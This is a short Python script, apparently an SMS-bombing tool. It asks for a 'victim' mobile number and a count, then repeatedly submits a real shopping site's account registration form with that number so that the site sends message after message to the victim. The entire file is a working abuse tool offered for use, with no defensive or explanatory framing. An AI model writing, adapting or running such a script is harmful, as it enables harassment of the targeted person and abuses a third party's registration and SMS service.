import requests
from requests.structures import CaseInsensitiveDict
number=str(input("ENTER VICTIM MOBILE NUMBER : "))
amount=int(input ("ENTER THE AMOUNT : "))
url = "https://www.mantrimart.com/my-account-2/"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "m=yes&twy_mobile="+number+"&twy_email=clown_op%40outlook.com&submit=Register"

for j in range (amount):
 resp = requests.post(url, headers=headers, data=data)
 print(str(j+1)+"SMS Sent")

